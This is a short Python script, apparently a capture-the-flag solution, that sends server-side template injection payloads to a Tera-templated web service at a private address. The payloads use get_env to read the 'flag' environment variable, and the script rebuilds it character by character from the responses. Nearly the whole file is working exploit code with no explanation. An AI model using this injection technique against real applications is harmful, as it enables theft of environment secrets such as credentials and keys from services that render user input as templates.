import requests
import socket
import socks
url = "http://172.10.0.3:8081/"

string = "0123456789abcdefghijklmnopqrstuvwxyz-{"

proxy={"http":"127.0.0.1:8081"}



flag = ['}'] * 42

for i in string:
    data = """
    {% set arr = [__tera_context] %}
    {% set f = get_env(name="fl"~"ag") %}
    {%- for char in f -%}
    {%- if char == '""" + i + """' -%}""" + i + """
    {%- else -%}
    <
    {%- endif -%}
    {% endfor %}"""

    resp = requests.post(url=url, data=data).text

    arr1 = [char for char in resp][4:]

    for j in range(len(arr1)):
        if(arr1[j]!='<'):
            flag[j] = arr1[j]
    # flag[resp.index(i)] = i
print(''.join(flag))